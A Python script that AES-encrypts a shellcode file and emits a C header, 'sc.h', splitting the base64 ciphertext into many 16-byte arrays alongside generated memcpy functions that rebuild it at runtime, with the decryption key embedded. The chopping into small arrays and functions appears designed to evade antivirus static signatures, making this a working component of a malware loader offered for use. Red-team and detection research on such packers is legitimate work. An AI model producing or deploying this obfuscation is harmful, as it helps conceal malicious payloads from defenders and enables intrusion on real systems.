from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto import Random
import os
import sys
import string
import random
#key = b"HrKHQxhUNxWuQxYdVEOZhoYbRcHeFmHS"
 
key = ''.join(random.choice(string.ascii_letters) for i in range(32))
key = key.encode()

if len(sys.argv) == 3:
    key = sys.argv[2].encode()
    

try:
    file = open(sys.argv[1], 'rb')
    data = file.read()
    file.close()
except IndexError:
    data = shellcode

data += b'\x00\x00\x00\x00'

iv = Random.new().read(AES.block_size)

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(data, AES.block_size))
ciphertext = b64encode(iv + enc)

file = open('../sc.h', 'w')
i = 1
k = 0
file.write('#define _CRT_SECURE_NO_WARNINGS\n#pragma once\n#include <string.h>\n\n')
for j in range(len(ciphertext)):
    elt = ciphertext[j]
    if(i%16 == 1):
        if(i//16 % 2 == 0):
            file.write('const char sc_' + format(i//16) + '[16] = {')
        else:
            file.write('char sc_' + format(i//16) + '[16] = {')
        k += 1

    file.write('{}'.format(hex(elt)))

    if(i%16 == 0):
        file.write('};\n')

    elif j != len(ciphertext) - 1:
        file.write(',')
    i += 1

if(i%16 != 1):
    file.write('};\n')

file.write('\nchar sc[{}];\n'.format(len(ciphertext)))
file.write('int sc_length = {};\n'.format(len(ciphertext)))

file.write("void buildsc_0(){\n")
l = 1
m = 1
for i in range(k):
    file.write('\tmemcpy(&sc[{}], sc_{}, 16);\n'.format(i*16, i))
    if(l % 200 == 0):
        file.write("}\nvoid buildsc_" + format(m) + "(){\n")
        m += 1
    l += 1
file.write("}\n")

file.write("void buildsc(){\n")
for i in range(m):
    file.write("\tbuildsc_{}();\n".format(i))
file.write("}")

file.write('\nBYTE key[] = "{}";\n'.format(key.decode()))
file.close()